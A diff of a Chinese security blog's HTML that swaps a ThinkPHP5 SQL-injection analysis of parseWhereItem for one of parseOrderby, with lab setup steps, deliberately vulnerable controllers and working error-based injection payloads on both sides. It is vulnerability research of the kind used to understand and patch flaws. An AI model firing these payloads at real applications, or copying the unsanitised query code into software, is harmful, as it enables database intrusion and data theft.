@@ -18,7 +18,7 @@
   <meta name="author" content="sp4z">
   <meta name="keywords" content="">
   
-  <title>thinkphp5框架SQL注入分析：parseWhereItem - sp4z&#39;s Blog</title>
+  <title>thinkphp5框架SQL注入分析：parseOrderby - sp4z&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="thinkphp5框架SQL注入分析：parseWhereItem">
+            <span class="h2" id="subtitle" title="thinkphp5框架SQL注入分析：parseOrderby">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-07-22 07:47" pubdate>
-        2021年7月22日 早上
+      <time datetime="2021-07-22 14:39" pubdate>
+        2021年7月22日 下午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      469 字
+      448 字
     </span>
   
 
@@ -225,74 +225,52 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">thinkphp5框架SQL注入分析：parseWhereItem</h1>
+            <h1 style="display: none">thinkphp5框架SQL注入分析：parseOrderby</h1>
             
             <div class="markdown-body">
-              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞位置在Mysql类的parseWhereItem方法，select注入</p>
-<p>漏洞影响版本： <strong>ThinkPHP5全版本</strong> 。</p>
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞存在于Builder类的parseOrderby方法中，order by注入</p>
+<p>漏洞影响版本： <strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong> 。</p>
+<p>测试的时候用php7一直报错，换成php5才行</p>
 <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载源码</p>
-<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.0.<span class="hljs-string">10 </span><span class="hljs-string">tp501</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink/</span><span class="hljs-string">think=</span>5.1.<span class="hljs-string">22 </span><span class="hljs-string">tp5122</span><br></code></pre></td></tr></table></figure>
 
 
 
-<p>创建数据库，在database.php配置连接信息</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> tpdemo1;<br><span class="hljs-keyword">use</span> tpdemo1;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">users</span>(<br>	<span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span> primary <span class="hljs-keyword">key</span> auto_increment,<br>	username <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><br>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<p>修改composer.json，执行composer update</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>       <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.6.0&quot;</span>,<br>       <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.1.22&quot;</span><br>   &#125;<br></code></pre></td></tr></table></figure>
 
 
 
-<p> /application/index/controller/Index.php </p>
 <p>添加控制器</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$username</span> = request()-&gt;get(<span class="hljs-string">&#x27;username&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;exp&#x27;</span>,<span class="hljs-variable">$username</span>)-&gt;select();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;select success&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$orderby</span> = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;test&#x27;</span>])-&gt;order(<span class="hljs-variable">$orderby</span>)-&gt;find();<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
 
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">?username=) <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> <span class="hljs-title">updatexml</span>(1,<span class="hljs-title">concat</span>(0<span class="hljs-title">x7</span>,<span class="hljs-title">user</span>(),0<span class="hljs-title">x7e</span>),1)--+</span><br></code></pre></td></tr></table></figure>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost/tp5122/public/?orderby</span>[<span class="hljs-string">id`||updatexml(1,concat(0x7e,user()),0)%23</span>]=1<br></code></pre></td></tr></table></figure>
 
-<p><a href="https://imgtu.com/i/Wwhk9K"><img src="https://z3.ax1x.com/2021/07/22/Wwhk9K.png" srcset="/img/loading.gif" lazyload alt="Wwhk9K.png"></a></p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先在控制器这里打断点</p>
-<p><a href="https://imgtu.com/i/WwhPtx"><img src="https://z3.ax1x.com/2021/07/22/WwhPtx.png" srcset="/img/loading.gif" lazyload alt="WwhPtx.png"></a></p>
-<p><code>/thinkphp/library/think/db/Query.php</code></p>
-<p>调用parseWhereExp，然后返回$this</p>
-<p><a href="https://imgtu.com/i/WwhCA1"><img src="https://z3.ax1x.com/2021/07/22/WwhCA1.png" srcset="/img/loading.gif" lazyload alt="WwhCA1.png"></a></p>
-<p><code>/thinkphp/library/think/db/Query.php</code></p>
-<p>进入parseWhereExp，主要是对输入的查询表达式进行分析，然后赋值给$this-&gt;options[‘where’]</p>
-<p><a href="https://imgtu.com/i/Wwhih6"><img src="https://z3.ax1x.com/2021/07/22/Wwhih6.png" srcset="/img/loading.gif" lazyload alt="Wwhih6.png"></a></p>
-<p><code>/thinkphp/library/think/db/Query.php</code></p>
-<p>接下来进入select。</p>
-<ol>
-<li>首先调用parseExpress，功能是取出$this-&gt;options的值赋值给$options数组。</li>
-<li>然后把$options数组作为参数传递给think\db\Builder类的select方法，生成sql语句。</li>
-<li>最后调用query方法执行sql语句</li>
-</ol>
-<p><a href="https://imgtu.com/i/WwhA1O"><img src="https://z3.ax1x.com/2021/07/22/WwhA1O.png" srcset="/img/loading.gif" lazyload alt="WwhA1O.png"></a></p>
-<p>$options数组</p>
-<p><a href="https://imgtu.com/i/WwhEcD"><img src="https://z3.ax1x.com/2021/07/22/WwhEcD.png" srcset="/img/loading.gif" lazyload alt="WwhEcD.png"></a></p>
-<p><code>/thinkphp/library/think/db/Builder.php</code></p>
-<p>进入think\db\Builder类的select方法，用str_replace替换模板生成sql语句。这里详细看一下parseWhere方法</p>
-<p><a href="https://imgtu.com/i/WwhVje"><img src="https://z3.ax1x.com/2021/07/22/WwhVje.png" srcset="/img/loading.gif" lazyload alt="WwhVje.png"></a></p>
-<p>经过一系列parseXXX方法后生成的sql语句</p>
-<p><a href="https://imgtu.com/i/WwhmBd"><img src="https://z3.ax1x.com/2021/07/22/WwhmBd.png" srcset="/img/loading.gif" lazyload alt="WwhmBd.png"></a></p>
-<p><code>/thinkphp/library/think/db/Builder.php</code></p>
-<p>由于$options[‘soft_delete’]为空，所以这里只执行了buildWhere。</p>
-<p><a href="https://imgtu.com/i/WwhenH"><img src="https://z3.ax1x.com/2021/07/22/WwhenH.png" srcset="/img/loading.gif" lazyload alt="WwhenH.png"></a></p>
-<p>经过buildWhere后生成的whereStr</p>
-<p><a href="https://imgtu.com/i/WwhnHA"><img src="https://z3.ax1x.com/2021/07/22/WwhnHA.png" srcset="/img/loading.gif" lazyload alt="WwhnHA.png"></a></p>
-<p>最后返回的结果就是$whereStr前面拼接上WHERE</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">WHERE ( <span class="hljs-string">`username`</span> ) <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> <span class="hljs-title">updatexml</span>(1,<span class="hljs-title">concat</span>(0<span class="hljs-title">x7</span>,<span class="hljs-title">user</span>(),0<span class="hljs-title">x7e</span>),1)--  )</span><br></code></pre></td></tr></table></figure>
+<p><a href="https://imgtu.com/i/W0veIK"><img src="https://z3.ax1x.com/2021/07/22/W0veIK.png" srcset="/img/loading.gif" lazyload alt="W0veIK.png"></a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>1.输入的payload在控制器中被传递给order方法</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?orderby<span class="hljs-built_in">[id</span>`||updatexml(<span class="hljs-number">1</span><span class="hljs-built_in">,concat</span>(<span class="hljs-number">0x7e</span>,user()),<span class="hljs-number">0</span>)<span class="hljs-meta">%23</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-
-
-<p><code>/thinkphp/library/think/db/Builder.php</code></p>
-<p>进入buildWhere，看看sql语句具体是怎么拼接的</p>
-<p>首先遍历$where也就是$options[‘where’]，然后把里面的值作为参数传入parseWhereItem</p>
-<p><a href="https://imgtu.com/i/WwhKAI"><img src="https://z3.ax1x.com/2021/07/22/WwhKAI.png" srcset="/img/loading.gif" lazyload alt="WwhKAI.png"></a></p>
-<p><code>/thinkphp/library/think/db/Builder.php</code></p>
-<p>在parseWhereItem中，直接拼接了sql语句</p>
-<p><a href="https://imgtu.com/i/WwhMNt"><img src="https://z3.ax1x.com/2021/07/22/WwhMNt.png" srcset="/img/loading.gif" lazyload alt="WwhMNt.png"></a></p>
-<p>只要$exp等于EXP就会直接拼接sql语句</p>
-<p><a href="https://imgtu.com/i/WwhQ4P"><img src="https://z3.ax1x.com/2021/07/22/WwhQ4P.png" srcset="/img/loading.gif" lazyload alt="WwhQ4P.png"></a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a href="https://imgtu.com/i/Wwh19f"><img src="https://z3.ax1x.com/2021/07/22/Wwh19f.png" srcset="/img/loading.gif" lazyload alt="Wwh19f.png"></a></p>
+<p><a href="https://imgtu.com/i/W0vVVx"><img src="https://z3.ax1x.com/2021/07/22/W0vVVx.png" srcset="/img/loading.gif" lazyload alt="W0vVVx.png"></a></p>
+<p>2.输入的orderby数组在order方法中被赋值给了<code>$this-&gt;options[&#39;order&#39;]</code></p>
+<p><a href="https://imgtu.com/i/W0vZa6"><img src="https://z3.ax1x.com/2021/07/22/W0vZa6.png" srcset="/img/loading.gif" lazyload alt="W0vZa6.png"></a></p>
+<p>3.order方法结束后进入find，然后再调用think\db\connection\Mysql的find</p>
+<p><a href="https://imgtu.com/i/W0vhQJ"><img src="https://z3.ax1x.com/2021/07/22/W0vhQJ.png" srcset="/img/loading.gif" lazyload alt="W0vhQJ.png"></a></p>
+<p>4.在think\db\connection\Mysql的find中，主要干了两件事</p>
+<ul>
+<li>select生成sql语句</li>
+<li>query执行sql语句</li>
+</ul>
+<p>先来看select</p>
+<p><a href="https://imgtu.com/i/W0v7o6"><img src="https://z3.ax1x.com/2021/07/22/W0v7o6.png" srcset="/img/loading.gif" lazyload alt="W0v7o6.png"></a></p>
+<p>5.select方法中取出了之前赋值给<code>$this-&gt;options[&#39;order&#39;]</code>的数组，也就是我们输入的orderby数组，然后传递给parseOrder。最后用str_replace替换模板生成sql语句</p>
+<p><a href="https://imgtu.com/i/W0v1sA"><img src="https://z3.ax1x.com/2021/07/22/W0v1sA.png" srcset="/img/loading.gif" lazyload alt="W0v1sA.png"></a></p>
+<p>6.在parseOrder中，用户输入未经过任何过滤就拼接到sql语句中，只需要闭合掉在parseKey中拼接上的反引号即可。值得注意的是这里实际被拼接进sql语句的是传入orderby数组的键$key，数组的值最终传递给$sort然后被注释掉</p>
+<p><a href="https://imgtu.com/i/W0vdzQ"><img src="https://z3.ax1x.com/2021/07/22/W0vdzQ.png" srcset="/img/loading.gif" lazyload alt="W0vdzQ.png"></a></p>
+<p>7.最后生成好的$sql被带入query执行</p>
+<p><a href="https://imgtu.com/i/W0v6oV"><img src="https://z3.ax1x.com/2021/07/22/W0v6oV.png" srcset="/img/loading.gif" lazyload alt="W0v6oV.png"></a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>需要注意下parseOrder中拼接sql语句的过程，理解为什么要把注入语句放在orderby数组的键中。</p>
 
             </div>
             <hr>
@@ -313,18 +291,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/07/22/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseOrderby/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">thinkphp5框架SQL注入分析：parseOrderby</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/20/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseArrayData/">
-                        <span class="hidden-mobile">thinkphp5框架SQL注入分析：parseArrayData</span>
+                      <a href="/2021/07/22/thinkphp5%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%9AparseWhereItem/">
+                        <span class="hidden-mobile">thinkphp5框架SQL注入分析：parseWhereItem</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
